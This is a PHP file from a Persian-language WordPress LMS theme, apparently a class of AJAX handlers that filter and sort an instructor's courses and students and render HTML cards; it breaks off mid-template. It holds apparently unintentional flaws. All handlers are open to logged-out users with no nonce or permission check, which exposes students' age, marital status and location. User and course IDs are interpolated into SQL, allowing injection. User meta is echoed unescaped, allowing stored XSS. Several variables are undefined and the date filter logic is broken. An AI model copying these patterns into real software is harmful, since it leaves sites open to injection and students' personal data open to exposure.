<?php

use Tutor\Models\CourseModel;

class instructorDashboard
{
    // Define the meta key for FAQ fields
    private $meta_key = '_tutor_story_video';

    // Initialize the class
    function __construct()
    {
        add_action('wp_ajax_save_instructor_metadata', array($this, 'save_instructor_metadata'));
        add_action('wp_ajax_nopriv_save_instructor_metadata', array($this, 'save_instructor_metadata'));

        add_action('wp_ajax_check_username', array($this, 'check_username'));
        add_action('wp_ajax_nopriv_check_username', array($this, 'check_username'));

        add_action('wp_ajax_change_course_status', array($this, 'change_course_status'));
        add_action('wp_ajax_nopriv_change_course_status', array($this, 'change_course_status'));

        add_action('wp_ajax_course_filter', array($this, 'course_filter'));
        add_action('wp_ajax_nopriv_course_filter', array($this, 'course_filter'));

        add_action('wp_ajax_course_sort', array($this, 'course_sort'));
        add_action('wp_ajax_nopriv_course_sort', array($this, 'course_sort'));

        add_action('wp_ajax_students_sort', array($this, 'students_sort'));
        add_action('wp_ajax_nopriv_students_sort', array($this, 'students_sort'));

        add_action('wp_ajax_students_filter', array($this, 'students_filter'));
        add_action('wp_ajax_nopriv_students_filter', array($this, 'students_filter'));

        add_action('wp_ajax_select_course', array($this, 'select_course'));
        add_action('wp_ajax_nopriv_select_course', array($this, 'select_course'));
    }

    public function students_filter()
    {
        $cities = ($_POST['cities']);
        $start_date = strtotime(sanitize_text_field($_POST['startDate']));
        $end_date = strtotime(sanitize_text_field($_POST['endDate']));
        $instructor = sanitize_text_field($_POST['instructor']);

        $limit        = 20;
        $current_page = max(1, tutils()->array_get('current_page', $_GET));
        $offset       = ($current_page - 1) * $limit;

        $my_students    = Edumall_Tutor::instance()->get_students_by_instructor($instructor, $offset, $limit);

        // Start constructing the query
        $args = array(
            'meta_query' => array()
        );

        // Add city criteria if cities array is not empty
        if (!empty($cities)) {
            $args['meta_query'] = array(
                'key'     => 'city',
                'value'   => $cities,
                'compare' => 'IN'
            );
        }

        // Add date range criteria if both date start and date end are set
        if (!empty($startDate) || !empty($endDate)) {
            $args['date_query'] =  array(
                array(
                    'after' => 'January 1st, 2013',
                    'before' => array(
                        'year' => 2024,
                        'month' => 2,
                        'day' => 28,
                    ),
                    'inclusive' => true,
                ),
            );
        }

        $user_query = new WP_User_Query($args);
        $users = $user_query->get_results();

        ob_start();
        foreach ($my_students as $student) : ?>
            <?php
            $profile_url             = tutor_utils()->profile_url($student->ID);
            $enrolled_courses_action = tutor_utils()->get_tutor_dashboard_page_permalink('my-students/enrolled-courses/?student_id=' . $student->ID);
            $student_avatar = edumall_get_avatar($student->ID, 70);
            $student_register_date = strtotime($student->user_registered);
            $student_progress = tutor_utils()->get_course_completed_percent($course_ids, $student->ID);
            $registered_date = parsidate("Y/m/j",  strtotime($student_registered_date));
            $student_location = get_user_meta($student->ID, "_student_location", true);
            $student_refer = get_user_meta($student->ID, "_student_refer", true);
            $student_marriage = get_user_meta($student->ID, "_student_marriage", true);
            $student_age = get_user_meta($student->ID, "_student_age", true);

            if (boolval($start_date) && boolval($end_date)) :
                if ($student_register_date < $start_date && $student_register_date > $end_date) :
                    continue;
                endif;
            elseif (boolval($start_date)) :
                if ($student_register_date < $start_date) :
                    continue;
                endif;
            else :
                if ($student_register_date > $end_date) :
                    continue;
                endif;
            endif;

            ?>
            <div class="student-box">
                <div class="student-box-info">
                    <div class="student-box-info-avatar">
                        <?php if (empty($student_avatar)) : ?>
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/avatar-placeholder.jpg' ?>" alt="">
                        <?php
                        else :
                            echo $student_avatar;
                        endif;
                        ?>
                    </div>
                    <h6 class="student-box-info-name"><?php echo esc_html($student->display_name); ?></h6>
                </div>
                <div class="student-box-meta">
                    <div class="student-box-meta-top">
                        <div class="student-box-meta-item">
                            <div class="student-box-meta-progress-circles">
                                <span class="circle full">
                                    <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                        <circle class="progress" cx="50%" cy="50%" r="4"></circle>
                                    </svg>
                                </span>
                                <span class="circle percent">
                                    <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                        <circle class="progress" cx="50%" cy="50%" r="4"></circle>
                                    </svg>
                                </span>
                            </div>
                        </div>

                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/calendar-2.svg' ?>" alt="">
                            <p> <?php echo $registered_date; ?> </p>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/location.svg' ?>" alt="">
                            <p> <?php echo $student_location; ?> </p>
                        </div>
                        <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/arrow-down.svg' ?>" alt="">
                    </div>

                    <div class="student-box-meta-bottom">
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/discount-circle.svg' ?>" alt="">
                            <?php echo $student_refer ?>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/heart-tick.svg' ?>" alt="">
                            <?php echo $student_marriage ?>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/calendar-circle.svg' ?>" alt="">
                            <?php echo $student_age ?>
                        </div>
                    </div>
                </div>
            </div>
        <?php endforeach;

        $result = ob_get_clean();
        // Get the results

        wp_send_json(array('result' => $result));
    }

    public function course_filter()
    {
        $status = ($_POST['status']);
        $category = ($_POST['category']);
        $instructor = sanitize_text_field($_POST['instructor']);

        $args = array(
            'post_type' => 'courses',
            'post_status' => $status,
            'author' => $instructor,
            'tax_query' => !empty($category) ? array(
                array(
                    'taxonomy' => 'course-category',
                    'field' => 'id',
                    'terms' => $category,
                ),
            ) : ''
        );
        $query = new WP_Query($args);
        $default_thumbnail_src = tutor()->url . 'assets/images/placeholder.svg';

        ob_start();

        while ($query->have_posts()) : $query->the_post();
            $course_rating = tutor_utils()->get_course_rating();
            $course_reviews = tutor_utils()->get_course_reviews(get_the_ID());
            $terms = get_the_terms(get_the_ID(), 'course-category');
            $reviews_count = sizeof($course_reviews);
            $avg_rating = $course_rating->rating_avg;
            $rating_count = $course_rating->rating_count;
            $id_string_delete = 'tutor_my_courses_delete_' . get_the_ID();
            $row_id = 'instructor-course-' . get_the_ID();
        ?>
            <div id="<?php echo $row_id ?>" class="edumall-box instructor-courses-wrap-boxes-course instructor-course-<?php the_ID(); ?>">
                <div class="instructor-courses-wrap-boxes-course-header">
                    <a href="<?php the_permalink(); ?>">
                        <?php if (has_post_thumbnail()) : ?>
                            <?php Edumall_Image::the_post_thumbnail([
                                'alt'  => get_the_title(),
                            ]); ?>
                        <?php else : ?>
                            <?php echo Edumall_Image::build_img_tag([
                                'src' => $default_thumbnail_src,
                                'alt' => get_the_title(),
                            ]) ?>
                        <?php endif; ?>
                    </a>
                    <h3 class="course-title"><a href="<?php the_permalink(); ?>" class="link-in-title"><?php the_title(); ?></a></h3>
                    <div class="instructor-dropdown-parent">
                        <img class="instructor-dropdown-parent-icon" src="<?php echo get_stylesheet_directory_uri() . '/assets/images/more.svg' ?>" alt="">
                        <div id="table-dashboard-course-list-<?php echo esc_attr(get_the_ID()); ?>" class="instructor-dropdown-parent-menu">

                            <!-- Move to Draf Action -->
                            <div class="instructor-dropdown-item">
                                <input type="checkbox" name="" <?php echo in_array(get_post_status(), array(CourseModel::STATUS_PUBLISH)) ? '' : 'checked' ?>>

                                <a class="instructor-dropdown-item-status" href="#" data-course-action='hide-course' data-course-id='<?php echo get_the_ID() ?>'>
                                    <?php esc_html_e('پنهان کردن', 'edumall-child'); ?>
                                </a>
                            </div>

                            <!-- # Move to Draft Action -->

                            <!-- Edit Action -->
                            <div class="instructor-dropdown-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/edit.svg' ?>" alt="">
                                <a href="<?php echo esc_url(tutor_utils()->get_tutor_dashboard_page_permalink('course/course-edit/?course_ID=' . get_the_ID())); ?>">
                                    <?php esc_html_e('ویرایش', 'edumall-child'); ?>
                                </a>
                            </div>
                            <!-- # Edit Action -->

                            <!-- Delete Action -->
                            <div class="instructor-dropdown-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/trash.svg' ?>" alt="">
                                <a id='instructor-dropdown-item-delete' class="instructor-dropdown-item-status" href="#" data-course-action='delete-course' data-course-id='<?php echo get_the_ID() ?>'>
                                    <?php esc_html_e('Delete', 'edumall-child'); ?>
                                </a>
                            </div>
                            <!-- # Delete Action -->

                        </div>
                    </div>
                </div>
                <?php if (get_post_status() === 'trash') : ?>
                    <div class="instructor-courses-wrap-boxes-course-declined">
                        <div class="declined-message">
                            <p>
                                این دوره به دلیل نقض قوانین هانیل تایید نشده است.
                            </p>
                        </div>
                        <div class="declined-contact">
                            <div class="declined-contact-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/policy.svg' ?>" alt="">
                                <a href="#">
                                    مشاهده قوانین
                                </a>
                            </div>
                            <div class="declined-contact-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/call.svg' ?>" alt="">
                                <a href="">
                                    تماس با پشتیبانی
                                </a>
                            </div>
                        </div>
                    </div>
                <?php endif ?>
                <div class="instructor-courses-wrap-boxes-course-meta">
                    <div class="instructor-course-metadata">
                        <?php
                        $course_students = tutor_utils()->count_enrolled_users_by_course();
                        ?>

                        <div class="instructor-course-metadata-status">
                            <?php
                            if (get_post_status() === 'pending') : ?>
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/pending.svg' ?>" alt="">
                                <p class="pending">در انتظار تایید</p>
                            <?php endif;
                            if (get_post_status() === 'publish') : ?>
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/verified.svg' ?>" alt="">
                                <p class="published">تایید شده</p>
                            <?php endif;
                            if (get_post_status() === 'trash') : ?>
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/denied.svg' ?>" alt="">
                                <p class="declined">تایید نشده</p>
                            <?php endif;
                            ?>
                        </div>

                        <div class="instructor-course-metadata-category">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/category.svg' ?>" alt="">
                            <?php if (!empty($terms)) : ?>
                                <?php foreach ($terms as $term) : ?>
                                    <p class="meta-value"><?php echo esc_html($term->name); ?></p>
                                <?php endforeach; ?>
                            <?php endif; ?>
                        </div>

                        <div class="instructor-course-metadata-enrolled">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/profile-students.svg' ?>" alt="">
                            <p class="meta-value"><?php echo esc_html($course_students); ?></p>
                        </div>

                        <div class="instructor-course-metadata-reviews">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/reviews.svg' ?>" alt="">
                            <p class="meta-value"><?php echo esc_html($reviews_count); ?></p>
                        </div>
                    </div>

                    <!-- Delete prompt modal -->
                    <div id="<?php echo $id_string_delete; ?>" class="tutor-modal modal-delete-my-course">
                        <div class="tutor-modal-overlay"></div>
                        <div class="tutor-modal-window">
                            <div class="tutor-modal-content tutor-modal-content-white">
                                <button class="tutor-iconic-btn tutor-modal-close-o" data-tutor-modal-close>
                                    <span class="tutor-icon-times" area-hidden="true"></span>
                                </button>

                                <div class="tutor-modal-body tutor-text-center">
                                    <div class="tutor-mt-48">
                                        <img class="tutor-d-inline-block" src="<?php echo tutor()->url; ?>assets/images/icon-trash.svg" />
                                    </div>

                                    <div class="tutor-fs-3 tutor-fw-medium tutor-color-black tutor-mb-12"><?php esc_html_e('Delete This Course?', 'edumall-child'); ?></div>
                                    <div class="tutor-fs-6 tutor-color-muted"><?php esc_html_e('Are you sure you want to delete this course permanently from the site? Please confirm your choice.', 'edumall-child'); ?></div>

                                    <div class="tutor-d-flex tutor-justify-center tutor-my-48">
                                        <button data-tutor-modal-close class="tutor-btn tutor-btn-outline-primary">
                                            <?php esc_html_e('Cancel', 'edumall-child'); ?>
                                        </button>
                                        <button class="tutor-btn tutor-btn-primary tutor-list-ajax-action tutor-ml-20" data-request_data='{"course_id":<?php echo get_the_ID(); ?>,"action":"tutor_delete_dashboard_course"}' data-delete_element_id="<?php echo $row_id; ?>">
                                            <?php esc_html_e('Yes, Delete This', 'edumall-child'); ?>
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        <?php endwhile;

        $result = ob_get_clean();

        wp_send_json(array('result' => $result));
    }

    public function check_username($username)
    {
        $username = !empty($_POST['username']) ? sanitize_text_field($_POST['username']) : $username;

        $user = get_users(array(
            'meta_key' => '_instructor_username',
            'meta_value' => $username
        ));

        wp_send_json(array('result' => $user));
    }


    public function select_course()
    {
        $instructor_id = sanitize_text_field($_POST['authorID']);
        $course_ids = sanitize_text_field($_POST['courseIds']);
        $type = sanitize_text_field($_POST['type']);

        switch ($type):
            case "all":
                $data = $this->selected_course($instructor_id, $course_ids, $type);
                wp_send_json(array('result' => $data));
                break;
            case "selected":
                $data = $this->selected_course($instructor_id, $course_ids, $type);
                wp_send_json(array('result' => $data));
                break;
        endswitch;
    }

    public function selected_course($instructor_id, $course_ids, $type)
    {
        global $wpdb;
        $students = [];

        if ($type === 'all') :
            $students = $wpdb->prepare(
                "SELECT DISTINCT student.* FROM {$wpdb->users} student
							INNER JOIN {$wpdb->posts} enrollment
									ON enrollment.post_author=student.ID
					WHERE 	1 =1 AND student.ID != %d 
							AND enrollment.post_type = %s
							AND enrollment.post_status = %s
					",
                $instructor_id, // Skip my self from list
                'tutor_enrolled',
                'completed',
            );

            $students = $wpdb->get_results($students);
        else :
            // Do nothing if this instructor has no publish courses.
            $where_course_ids = "AND enrollment.post_parent IN({$course_ids}) ";

            $students = $wpdb->prepare(
                "SELECT DISTINCT student.* FROM {$wpdb->users} student
							INNER JOIN {$wpdb->posts} enrollment
									ON enrollment.post_author=student.ID
					WHERE 	1 =1 AND student.ID != %d {$where_course_ids}
							AND enrollment.post_type = %s
							AND enrollment.post_status = %s
					",
                $instructor_id, // Skip my self from list
                'tutor_enrolled',
                'completed',
            );

            $students = $wpdb->get_results($students);
        endif;

        ob_start();
        foreach ($students as $student) :

            $student_avatar = edumall_get_avatar($student->ID, 70);
            $student_progress = tutor_utils()->get_course_completed_percent($course_ids, $student->ID);
            $student_registered_date = $student->user_registered;
            $registered_date = parsidate("Y/m/j",  strtotime($student_registered_date));
            $student_location = get_user_meta($student->ID, "_student_location", true);
            $student_refer = get_user_meta($student->ID, "_student_refer", true);
            $student_marriage = get_user_meta($student->ID, "_student_marriage", true);
            $student_age = get_user_meta($student->ID, "_student_age", true);
        ?>
            <div class="student-box" data-progress="<?php echo intval($student_progress) ?>" data-date="<?php echo $student_registered_date ?>">
                <div class="student-box-info">
                    <div class="student-box-info-avatar">
                        <?php if (empty($student_avatar)) : ?>
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/avatar-placeholder.jpg' ?>" alt="">
                        <?php
                        else :
                            echo $student_avatar;
                        endif;
                        ?>
                    </div>
                    <h6 class="student-box-info-name"><?php echo esc_html($student->display_name); ?></h6>
                </div>
                <div class="student-box-meta">
                    <div class="student-box-meta-top">
                        <div class="student-box-meta-item">
                            <div class="student-box-meta-progress-circles">
                                <span class="circle full">
                                    <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                        <circle class="progress" cx="50%" cy="50%" r="4"></circle>
                                    </svg>
                                </span>
                                <span class="circle percent">
                                    <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                        <circle class="progress" cx="50%" cy="50%" r="4"></circle>
                                    </svg>
                                </span>
                            </div>
                            <?php if ($type !== 'all') : ?>
                                <p><?php echo $student_progress ?>%</p>
                            <?php endif; ?>
                        </div>

                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/calendar-2.svg' ?>" alt="">
                            <p> <?php echo $registered_date; ?> </p>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/location.svg' ?>" alt="">
                            <p> <?php echo $student_location; ?> </p>
                        </div>
                        <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/arrow-down.svg' ?>" alt="">
                    </div>

                    <div class="student-box-meta-bottom">
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/discount-circle.svg' ?>" alt="">
                            <?php echo $student_refer ?>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/heart-tick.svg' ?>" alt="">
                            <?php echo $student_marriage ?>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/calendar-circle.svg' ?>" alt="">
                            <?php echo $student_age ?>
                        </div>
                    </div>
                </div>
            </div>
        <?php
        endforeach;
        $output = ob_get_clean();
        return $output;
    }

    public function students_sort()
    {
        $current_user_id = sanitize_text_field($_POST['authorID']);
        $sort = sanitize_text_field($_POST['sort']);

        switch ($sort):
            case "registered":
                $data = $this->sort_students($current_user_id, $sort);
                wp_send_json(array('result' => $data));
                break;
            case "progress":
                $data = $this->sort_students($current_user_id, $sort);
                wp_send_json(array('result' => $data));
                break;
        endswitch;
    }

    public function sort_students($user_id, $type)
    {

        global $wpdb;
        $my_students = [];

        $instructor_id = tutor_utils()->get_user_id($user_id);

        $my_courses = Edumall_Tutor::instance()->get_course_ids_by_instructor($user_id);

        if ($type === 'registered') :
            // Do nothing if this instructor has no publish courses.
            if (!empty($my_courses)) :
                $course_ids       = "'" . implode("','", $my_courses) . "'";
                $where_course_ids = "AND enrollment.post_parent IN({$course_ids}) ";

                $students = $wpdb->prepare(
                    "SELECT DISTINCT student.* FROM {$wpdb->users} student
                    INNER JOIN {$wpdb->posts} enrollment
                            ON enrollment.post_author=student.ID
            WHERE 	1 =1 AND student.ID != %d {$where_course_ids}
                    AND enrollment.post_type = %s
                    AND enrollment.post_status = %s
            ORDER BY user_registered DESC;
            ",
                    $instructor_id, // Skip my self from list
                    'tutor_enrolled',
                    'completed',
                );

                $my_students = $wpdb->get_results($students);
            endif;
        else :
            // Do nothing if this instructor has no publish courses.
            if (!empty($my_courses)) {
                $course_ids       = "'" . implode("','", $my_courses) . "'";
                $where_course_ids = "AND enrollment.post_parent IN({$course_ids}) ";

                $students = $wpdb->prepare(
                    "SELECT DISTINCT student.* FROM {$wpdb->users} student
                    INNER JOIN {$wpdb->posts} enrollment
                            ON enrollment.post_author=student.ID
            WHERE 	1 =1 AND student.ID != %d {$where_course_ids}
                    AND enrollment.post_type = %s
                    AND enrollment.post_status = %s
            ORDER BY user_registered DESC;
            ",
                    $instructor_id, // Skip my self from list
                    'tutor_enrolled',
                    'completed',
                );

                $my_students = $wpdb->get_results($students);
            }
        endif;

        ob_start();
        foreach ($my_students as $student) :
            $profile_url             = tutor_utils()->profile_url($student->ID);
            $enrolled_courses_action = tutor_utils()->get_tutor_dashboard_page_permalink('my-students/enrolled-courses/?student_id=' . $student->ID);
            $student_avatar = edumall_get_avatar($student->ID, 70);
            $student_progress = tutor_utils()->get_course_completed_percent();
            $student_registered_date = $student->user_registered;
            $registered_date = parsidate("Y/m/j",  strtotime($student_registered_date));
            $student_location = get_user_meta($student->ID, "_student_location", true);
            $student_refer = get_user_meta($student->ID, "_student_refer", true);
            $student_marriage = get_user_meta($student->ID, "_student_marriage", true);
            $student_age = get_user_meta($student->ID, "_student_age", true);
        ?>
            <div class="student-box">
                <div class="student-box-info">
                    <div class="student-box-info-avatar">
                        <?php if (empty($student_avatar)) : ?>
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/avatar-placeholder.jpg' ?>" alt="">
                        <?php
                        else :
                            echo $student_avatar;
                        endif;
                        ?>
                    </div>
                    <h6 class="student-box-info-name"><?php echo esc_html($student->display_name); ?></h6>
                </div>
                <div class="student-box-meta">
                    <div class="student-box-meta-top">
                        <div class="student-box-meta-item">
                            <div class="student-box-meta-progress-circles">
                                <span class="circle full">
                                    <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                        <circle class="progress" cx="50%" cy="50%" r="4"></circle>
                                    </svg>
                                </span>
                                <span class="circle percent">
                                    <svg viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg">
                                        <circle class="progress" cx="50%" cy="50%" r="4"></circle>
                                    </svg>
                                </span>
                            </div>
                        </div>

                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/calendar-2.svg' ?>" alt="">
                            <p> <?php echo $registered_date; ?> </p>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/location.svg' ?>" alt="">
                            <p> <?php echo $student_location; ?> </p>
                        </div>
                        <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/arrow-down.svg' ?>" alt="">
                    </div>

                    <div class="student-box-meta-bottom">
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/discount-circle.svg' ?>" alt="">
                            <?php echo $student_refer ?>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/heart-tick.svg' ?>" alt="">
                            <?php echo $student_marriage ?>
                        </div>
                        <div class="student-box-meta-item">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/calendar-circle.svg' ?>" alt="">
                            <?php echo $student_age ?>
                        </div>
                    </div>
                </div>
            </div>
        <?php
        endforeach;
        $output = ob_get_clean();
        return $output;
    }

    public function course_sort()
    {
        $current_user_id = sanitize_text_field($_POST['authorID']);
        $sort = sanitize_text_field($_POST['sort']);

        switch ($sort):
            case "latest":
                $data = $this->sort_courses($current_user_id, $sort);
                wp_send_json(array('result' => $data));
                break;
            case "enroll":
                $data = $this->sort_courses($current_user_id, $sort);
                wp_send_json(array('result' => $data));
                break;
            case "comment":
                $data = $this->sort_courses($current_user_id, $sort);
                wp_send_json(array('result' => $data));
                break;
        endswitch;
    }

    public function sort_courses($user_id, $type)
    {
        $default_thumbnail_src = tutor()->url . 'assets/images/placeholder.svg';

        global $wpdb;
        // Get the most commented posts
        if ($type === 'comment') :
            $courses = $wpdb->get_results(
                "
    SELECT 
        wp_posts.ID,
        wp_posts.post_title,
        wp_posts.post_status,
        COUNT(wp_comments.comment_ID) AS comment_count
    FROM 
        wp_posts
    LEFT JOIN 
        wp_comments ON wp_posts.ID = wp_comments.comment_post_ID
    WHERE 
        wp_posts.post_type = 'courses' AND      
        wp_posts.post_author = $user_id
    GROUP BY 
        wp_posts.ID
    ORDER BY 
        comment_count DESC
    "
            );
        elseif ($type === 'enroll') :
            $args = array(
                'post_type' => 'courses', // Adjust post type as needed
                'author' => $user_id,
                'post_status' => array('publish', 'pending', 'trash'),
                'orderby' => 'meta_value_num', // Sort by numeric value of meta key
                'order' => 'DESC', // Sort in descending order
                'posts_per_page' => -1, // Retrieve all courses
                'meta_query' => array(
                    'relation' => 'OR', // Use OR to include posts with and without the meta key
                    array(
                        'key' => '_course_total_enrolls',
                        'compare' => 'EXISTS'
                    ),
                    array(
                        'key' => '_course_total_enrolls',
                        'compare' => 'NOT EXISTS'
                    )
                )
            );

            $courses = get_posts($args);
        else :
            $args = array(
                'post_type' => 'courses', // Adjust post type as needed
                'post_status' => array('publish', 'pending', 'trash'),
                'author' => $user_id,
                'order' => 'DESC', // Sort in descending order
                'posts_per_page' => -1, // Retrieve all courses
            );

            $courses = get_posts($args);
        endif;

        ob_start();
        // Output the most commented posts
        foreach ($courses as $post) :
            $course_rating    = tutor_utils()->get_course_rating();
            $course_reviews    = tutor_utils()->get_course_reviews($post->ID);
            $terms = get_the_terms($post->ID, 'course-category');
            $reviews_count = sizeof($course_reviews);
            $avg_rating       = $course_rating->rating_avg;
            $rating_count     = $course_rating->rating_count;
            $id_string_delete = 'tutor_my_courses_delete_' . $post->ID;
            $row_id           = 'instructor-course-' . $post->ID;

        ?>
            <div id="<?php echo $row_id ?>" class="edumall-box instructor-courses-wrap-boxes-course instructor-course-<?php echo $post->ID; ?>">
                <div class="instructor-courses-wrap-boxes-course-header">
                    <a href="<?php the_permalink($post->ID); ?>">
                        <?php if (has_post_thumbnail($post->ID)) : ?>
                            <?php Edumall_Image::the_post_thumbnail([
                                'post_id' => $post->ID,
                                'alt'  => get_the_title(),
                            ]); ?>
                        <?php else : ?>
                            <?php echo Edumall_Image::build_img_tag([
                                'src' => $default_thumbnail_src,
                                'alt' => get_the_title(),
                            ]) ?>
                        <?php endif; ?>
                    </a>
                    <h3 class="course-title"><a href="<?php the_permalink($post->ID); ?>" class="link-in-title"><?php echo get_the_title($post->ID); ?></a></h3>
                    <div class="instructor-dropdown-parent">
                        <img class="instructor-dropdown-parent-icon" src="<?php echo get_stylesheet_directory_uri() . '/assets/images/more.svg' ?>" alt="">
                        <div id="table-dashboard-course-list-<?php echo esc_attr($post->ID); ?>" class="instructor-dropdown-parent-menu">

                            <!-- Move to Draf Action -->
                            <div class="instructor-dropdown-item">
                                <input type="checkbox" name="" <?php echo in_array($post->post_status, array(CourseModel::STATUS_PUBLISH)) ? '' : 'checked' ?>>

                                <a class="instructor-dropdown-item-status" href="#" data-course-action='hide-course' data-course-id='<?php echo $post->ID ?>'>
                                    <?php esc_html_e('پنهان کردن', 'edumall-child'); ?>
                                </a>
                            </div>

                            <!-- # Move to Draft Action -->

                            <!-- Edit Action -->
                            <div class="instructor-dropdown-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/edit.svg' ?>" alt="">
                                <a href="<?php echo esc_url(tutor_utils()->get_tutor_dashboard_page_permalink('course/edit-courses/?course_ID=' . $post->ID)); ?>">
                                    <?php esc_html_e('ویرایش', 'edumall-child'); ?>
                                </a>
                            </div>
                            <!-- # Edit Action -->

                            <!-- Delete Action -->
                            <div class="instructor-dropdown-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/trash.svg' ?>" alt="">
                                <a id='instructor-dropdown-item-delete' class="instructor-dropdown-item-status" href="#" data-course-action='delete-course' data-course-id='<?php echo $post->ID ?>'>
                                    <?php esc_html_e('Delete', 'edumall-child'); ?>
                                </a>
                            </div>
                            <!-- # Delete Action -->

                        </div>
                    </div>
                </div>
                <?php if ($post->post_status === 'trash') : ?>
                    <div class="instructor-courses-wrap-boxes-course-declined">
                        <div class="declined-message">
                            <p>
                                این دوره به دلیل نقض قوانین هانیل تایید نشده است.
                            </p>
                        </div>
                        <div class="declined-contact">
                            <div class="declined-contact-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/policy.svg' ?>" alt="">
                                <a href="#">
                                    مشاهده قوانین
                                </a>
                            </div>
                            <div class="declined-contact-item">
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/call.svg' ?>" alt="">
                                <a href="">
                                    تماس با پشتیبانی
                                </a>
                            </div>
                        </div>
                    </div>
                <?php endif ?>
                <div class="instructor-courses-wrap-boxes-course-meta">
                    <div class="instructor-course-metadata">
                        <?php
                        $course_students = tutor_utils()->count_enrolled_users_by_course($post->ID);
                        ?>

                        <div class="instructor-course-metadata-status">
                            <?php
                            if ($post->post_status === 'pending') : ?>
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/pending.svg' ?>" alt="">
                                <p class="pending">در انتظار تایید</p>
                            <?php endif;
                            if ($post->post_status === 'publish') : ?>
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/verified.svg' ?>" alt="">
                                <p class="published">تایید شده</p>
                            <?php endif;
                            if ($post->post_status === 'trash') : ?>
                                <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/denied.svg' ?>" alt="">
                                <p class="declined">تایید نشده</p>
                            <?php endif;
                            ?>
                        </div>

                        <div class="instructor-course-metadata-category">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/category.svg' ?>" alt="">
                            <?php foreach ($terms as $term) { ?>
                                <p class="meta-value"><?php echo esc_html($term->name); ?></p>
                            <?php } ?>
                        </div>

                        <div class="instructor-course-metadata-enrolled">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/profile-students.svg' ?>" alt="">
                            <p class="meta-value"><?php echo esc_html($course_students); ?></p>
                        </div>

                        <div class="instructor-course-metadata-reviews">
                            <img src="<?php echo get_stylesheet_directory_uri() . '/assets/images/reviews.svg' ?>" alt="">
                            <p class="meta-value"><?php echo esc_html($reviews_count); ?></p>
                        </div>
                    </div>

                    <!-- Delete prompt modal -->
                    <div id="<?php echo $id_string_delete; ?>" class="tutor-modal modal-delete-my-course">
                        <div class="tutor-modal-overlay"></div>
                        <div class="tutor-modal-window">
                            <div class="tutor-modal-content tutor-modal-content-white">
                                <button class="tutor-iconic-btn tutor-modal-close-o" data-tutor-modal-close>
                                    <span class="tutor-icon-times" area-hidden="true"></span>
                                </button>

                                <div class="tutor-modal-body tutor-text-center">
                                    <div class="tutor-mt-48">
                                        <img class="tutor-d-inline-block" src="<?php echo tutor()->url; ?>assets/images/icon-trash.svg" />
                                    </div>

                                    <div class="tutor-fs-3 tutor-fw-medium tutor-color-black tutor-mb-12"><?php esc_html_e('Delete This Course?', 'edumall-child'); ?></div>
                                    <div class="tutor-fs-6 tutor-color-muted"><?php esc_html_e('Are you sure you want to delete this course permanently from the site? Please confirm your choice.', 'edumall-child'); ?></div>

                                    <div class="tutor-d-flex tutor-justify-center tutor-my-48">
                                        <button data-tutor-modal-close class="tutor-btn tutor-btn-outline-primary">
                                            <?php esc_html_e('Cancel', 'edumall-child'); ?>
                                        </button>
